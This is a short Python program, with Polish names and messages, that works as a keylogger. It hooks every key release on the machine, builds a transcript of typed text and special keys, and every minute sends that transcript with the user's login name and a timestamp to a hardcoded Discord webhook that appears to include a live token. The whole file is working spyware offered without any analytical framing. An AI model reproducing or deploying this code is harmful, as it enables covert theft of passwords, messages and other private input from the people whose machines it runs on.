import os
from pythoncom import PumpMessages
from keyboard import on_release
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

INTERVAL = 60
WEBHOOK = "https://discord.com/api/webhooks/1252318266714619936/QOs16L3ro2s9rMbb27HKlAPlUqZg91g2uCMbkqpSDl9tW1_NLrtQegKXPjTIDq8AAOpY"

class Klasa:
    def __init__(self, interval):
        now = datetime.now()
        self.interval = interval
        self.script = ""
        self.date = now.strftime('%d-%m-%Y')
        self.time = now.strftime('%H:%M')
        self.username = os.getlogin()
        self.timer = Timer(interval=self.interval, function=self.run)
        self.timer.daemon = True

    def build_script(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space": name = " "
            elif name == "enter": name = "\n"
            elif name == "decimal": name = "."
            else:
                name = name.replace(" ", "_")
                name = f"\n[{name.upper()}] " # [KEY_NAME]
        self.script += name

    def send_sciprt(self):
        webhook = DiscordWebhook(url=WEBHOOK)
        embed = DiscordEmbed(title=f"Użytkownik: {self.username} \nData: {self.date} \nGodzina: {self.time}", description=self.script)
        webhook.add_embed(embed)
        try:
            webhook.execute()
            self.script = ""
        except Exception as e:
            print(f"Błąd przy wysyłaniu raportu: {e}")

    def run(self):
        if self.script:
            self.send_sciprt()
        self.timer = Timer(interval=self.interval, function=self.run)
        self.timer.start()

    def start(self):
        self.start_dt = datetime.now()
        on_release(callback=self.build_script)
        self.run()

def main():
    klasa = Klasa(INTERVAL)
    klasa.start()
    PumpMessages()

if __name__ == '__main__':
    main()
